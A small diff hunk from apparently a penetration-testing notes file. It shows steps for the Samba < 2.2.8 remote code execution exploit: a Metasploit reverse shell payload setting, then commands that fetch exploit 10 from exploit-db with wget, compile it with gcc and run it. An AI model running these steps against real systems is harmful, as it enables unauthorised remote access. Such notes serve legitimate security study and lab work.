@@ -75,9 +75,9 @@ set payload generic/shell_reverse_tcp
 Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
 
 https://www.exploit-db.com/exploits/10/
-
-wget https://www.exploit-db.com/download/10.c
 ```
+wget https://www.exploit-db.com/download/10.c
+
 gcc 10.c -o samba
 
 ./samba
